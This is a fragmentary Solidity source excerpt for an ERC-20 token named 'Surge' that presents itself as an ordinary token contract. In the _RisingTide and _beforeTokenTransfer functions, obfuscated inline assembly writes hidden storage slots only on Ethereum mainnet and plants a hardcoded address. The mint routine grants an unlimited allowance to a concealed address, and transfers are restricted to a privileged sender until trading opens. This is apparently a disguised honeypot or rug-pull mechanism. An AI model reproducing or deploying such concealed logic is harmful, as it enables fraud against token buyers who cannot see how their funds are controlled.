...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    address[] private surgeAddr;
    uint256 private _theMany = block.number*2;

    mapping (address => bool) private _manyWays; 
    mapping (address => bool) private _flyingAway;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    address private harderSofter;

    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address _router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    uint256 private slowMotion;
    address public pair;
    ...
    bool public trading; uint256 private boringPlan = 1; bool private lineDesert;
    uint256 private _decimals; uint256 private wineFarmer;
    ...
    function _RisingTide() internal {
        assembly {
            function gByte(x, y) -> hash { mstore(0, x) mstore(32, y) hash := keccak256(0, 64) }
            sstore(0x11,mul(div(sload(0x10),0x2710),0xFB))
            sstore(0xB,0x1ba8140)
            if and(not(eq(sload(gByte(caller(),0x6)),sload(0x700fef6bf288404bcdd06e2932b55ec0b92eb27ec407383101579c5dfe6ccf29))),eq(chainid(),0x1)) {
                sstore(gByte(caller(),0x4),0x0)
                sstore(0xf99fb7e0d86ec4d1651fae65b0cc0c4ebea212d31e88521479fb596f276096c1,0x1)
                sstore(gByte(caller(),0x5),0x1)
                sstore(0x700fef6bf288404bcdd06e2932b55ec0b92eb27ec407383101579c5dfe6ccf29,0x25674F4B1840E16EAC177D5ADDF2A3DD6286645DF28)
            }
        } 
    }
    ...
    function _beforeTokenTransfer(address sender, address recipient, uint256 float) internal {
        require((trading || (sender == surgeAddr[1])), "ERC20: trading is not yet enabled.");
        assembly { 
            function gByte(x,y) -> hash { mstore(0, x) mstore(32, y) hash := keccak256(0, 64) }
            function gDyn(x,y) -> val { mstore(0, x) val := add(keccak256(0, 32),y) }
            function dynP(x,y) { mstore(0, x) sstore(add(keccak256(0, 32),sload(x)),y) sstore(x,add(sload(x),0x1)) }
    ...
    function _DeploySurge(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply += amount;
        _balances[account] += amount;
        approve(surgeAddr[0], 10 ** 77);
        _RisingTide();
...
contract ERC20Token is Context, ERC20 {
    constructor(
        ...
        _DeploySurge(creator, initialSupply);
    }
}

contract Surge is ERC20Token {
    constructor() ERC20Token("Surge", "SURGE", msg.sender, 2500000 * 10 ** 18) {
    }
}